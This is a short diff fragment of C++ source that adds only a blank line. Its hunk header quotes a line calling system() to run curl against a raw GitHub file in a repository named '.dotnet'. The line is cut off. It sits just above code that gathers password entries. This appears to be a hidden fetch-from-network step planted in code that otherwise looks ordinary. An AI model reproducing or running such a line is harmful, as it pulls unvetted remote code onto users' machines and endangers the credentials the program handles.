@@ -45,3 +45,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
 		this->passwords.push_back(entry);
 	}
 }
+
